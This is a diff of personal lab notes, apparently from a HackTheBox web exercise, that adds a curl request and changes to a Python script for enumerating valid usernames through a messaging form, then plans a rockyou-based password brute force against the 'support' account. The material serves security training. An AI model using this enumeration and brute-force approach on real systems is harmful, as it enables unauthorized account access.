@@ -996,6 +996,8 @@ using a few different username lists and looking for the string "Message sent to
 
 ![](Images/Pasted%20image%2020240222120551.png)
 
+using the below request I can modify the brute force script to find usernames that successfully send a message:
+
 ```shell
 curl 'http://94.237.56.188:50709/messages.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.56.188:50709' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://94.237.56.188:50709/messages.php' -H 'Cookie: htb_sessid=MDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjY%3D' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'user=hi&message=hi&submit=submit'
 ```
@@ -1047,6 +1049,8 @@ def main():
         print("[!] Please check wordlist.")
         print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
         sys.exit()
+        
+    successful_names = []
 
     with open(fname) as fh:
         for fline in fh:
@@ -1060,6 +1064,14 @@ def main():
             # call function check() to verify if HTTP response text matches our content
             if (check(res, valid)):
                 print(f"{username} - message successfully sent")
+                successful_names.append(username)
+            else:
+                print(username)
+                
+        print("\n Successful names found: \n")
+        
+        for name in successful_names:
+            print(name)
 
 if __name__ == "__main__":
     main()
@@ -1068,6 +1080,17 @@ if __name__ == "__main__":
 so far the accounts found were: 
 - support
 - guest
-- test
-- 
+
+so now I can try to brute force the support account by modifying the rockyou list with our found password policy restrictions 
+
+to filter the list we need to consider the following password criteria: 
+- start with capital letter
+- contain at least 1 lowercase 
+- end with number 
+- contain one of these special characters: `$ # @`
+- be between 20 and 29 character length 
+
+
+
+
 
